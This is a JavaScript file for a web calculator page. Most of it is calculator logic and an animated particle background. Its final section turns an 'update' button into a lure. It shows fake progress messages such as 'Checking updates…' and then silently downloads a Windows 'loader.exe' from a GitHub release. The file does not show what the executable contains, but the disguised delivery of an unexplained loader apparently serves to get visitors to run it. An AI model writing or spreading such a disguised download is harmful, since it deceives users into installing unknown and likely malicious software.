/* Calculator */
const display = document.getElementById('display');
const historyEl = document.getElementById('history');
let current = '0';
let previous = null;
let operator = null;
let shouldReset = false;

function updateDisplay() {
  display.textContent = current;
}

function inputNumber(num) {
  if (shouldReset) {
    current = num === '.' ? '0.' : num;
    shouldReset = false;
  } else {
    if (num === '.' && current.includes('.')) return;
    if (current === '0' && num !== '.') {
      current = num;
    } else {
      current += num;
    }
  }
  updateDisplay();
}

function inputOperator(op) {
  if (previous !== null && operator && !shouldReset) {
    calculate();
  }
  previous = current;
  operator = op;
  shouldReset = true;
  historyEl.textContent = `${previous} ${op === '*' ? '×' : op === '/' ? '÷' : op}`;
}

function calculate() {
  if (previous === null || operator === null) return;
  const a = parseFloat(previous);
  const b = parseFloat(current);
  let result;

  switch (operator) {
    case '+': result = a + b; break;
    case '-': result = a - b; break;
    case '*': result = a * b; break;
    case '/': result = b === 0 ? 'Error' : a / b; break;
    default: return;
  }

  if (typeof result === 'number') {
    result = Math.round(result * 1e10) / 1e10;
    current = String(result);
  } else {
    current = result;
  }

  historyEl.textContent = `${previous} ${operator === '*' ? '×' : operator === '/' ? '÷' : operator} ${b} =`;
  previous = null;
  operator = null;
  shouldReset = true;
  updateDisplay();
}

function clearAll() {
  current = '0';
  previous = null;
  operator = null;
  shouldReset = false;
  historyEl.textContent = 'Ready';
  updateDisplay();
}

function toggleSign() {
  if (current === '0' || current === 'Error') return;
  current = current.startsWith('-') ? current.slice(1) : '-' + current;
  updateDisplay();
}

function percent() {
  current = String(parseFloat(current) / 100);
  updateDisplay();
}

document.querySelector('.buttons').addEventListener('click', (e) => {
  const btn = e.target.closest('.btn');
  if (!btn) return;

  const action = btn.dataset.action;
  const value = btn.dataset.value;

  if (value !== undefined && !action) {
    inputNumber(value);
  } else if (action === 'operator') {
    inputOperator(value);
  } else if (action === 'equals') {
    calculate();
  } else if (action === 'clear') {
    clearAll();
  } else if (action === 'sign') {
    toggleSign();
  } else if (action === 'percent') {
    percent();
  }
});

document.addEventListener('keydown', (e) => {
  if ((e.key >= '0' && e.key <= '9') || e.key === '.') {
    inputNumber(e.key);
  } else if (['+', '-', '*', '/'].includes(e.key)) {
    inputOperator(e.key);
  } else if (e.key === 'Enter' || e.key === '=') {
    e.preventDefault();
    calculate();
  } else if (e.key === 'Escape' || e.key === 'c' || e.key === 'C') {
    clearAll();
  } else if (e.key === 'Backspace') {
    if (current.length > 1) {
      current = current.slice(0, -1);
    } else {
      current = '0';
    }
    updateDisplay();
  }
});

/* Neural background */
const canvas = document.getElementById('neural-bg');
const ctx = canvas.getContext('2d');
let particles = [];
let width, height;

function resize() {
  width = canvas.width = window.innerWidth;
  height = canvas.height = window.innerHeight;
  initParticles();
}

function initParticles() {
  const count = Math.min(Math.floor((width * height) / 18000), 70);
  particles = [];
  for (let i = 0; i < count; i++) {
    particles.push({
      x: Math.random() * width,
      y: Math.random() * height,
      vx: (Math.random() - 0.5) * 0.35,
      vy: (Math.random() - 0.5) * 0.35,
      r: Math.random() * 1.8 + 0.6,
      hue: Math.random() > 0.6 ? 190 : Math.random() > 0.5 ? 280 : 320
    });
  }
}

function draw() {
  ctx.clearRect(0, 0, width, height);

  for (let i = 0; i < particles.length; i++) {
    const p = particles[i];
    p.x += p.vx;
    p.y += p.vy;
    if (p.x < 0 || p.x > width) p.vx *= -1;
    if (p.y < 0 || p.y > height) p.vy *= -1;
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
    ctx.fillStyle = `hsla(${p.hue}, 90%, 65%, 0.7)`;
    ctx.fill();
  }

  for (let i = 0; i < particles.length; i++) {
    for (let j = i + 1; j < particles.length; j++) {
      const a = particles[i];
      const b = particles[j];
      const dx = a.x - b.x;
      const dy = a.y - b.y;
      const dist = Math.sqrt(dx * dx + dy * dy);
      if (dist < 130) {
        const alpha = 1 - dist / 130;
        ctx.beginPath();
        ctx.moveTo(a.x, a.y);
        ctx.lineTo(b.x, b.y);
        ctx.strokeStyle = `hsla(200, 80%, 60%, ${alpha * 0.25})`;
        ctx.lineWidth = 0.8;
        ctx.stroke();
      }
    }
  }

  requestAnimationFrame(draw);
}

window.addEventListener('resize', resize);
resize();
draw();

/* Update button → download loader.exe after animations */
const btnSync = document.getElementById('btn-sync');
const loaderText = document.getElementById('loader-text');
const loaderVisual = document.getElementById('loader-visual');

const DOWNLOAD_URL = 'https://github.com/Helixleet/calculator-loader-fadikz/releases/download/1.0/loader.exe';

function delay(ms) {
  return new Promise(r => setTimeout(r, ms));
}

btnSync.addEventListener('click', async () => {
  btnSync.classList.add('loading');
  loaderVisual.classList.add('active');

  loaderText.textContent = 'Connecting…';
  await delay(700);

  loaderText.textContent = 'Checking updates…';
  await delay(900);

  loaderText.textContent = 'Preparing download…';
  await delay(600);

  loaderText.textContent = 'Starting download…';
  await delay(400);

  // Trigger download
  const a = document.createElement('a');
  a.href = DOWNLOAD_URL;
  a.download = 'loader.exe';
  a.style.display = 'none';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  loaderText.textContent = 'Download started ✓';
  loaderVisual.classList.remove('active');
  btnSync.classList.remove('loading');
});
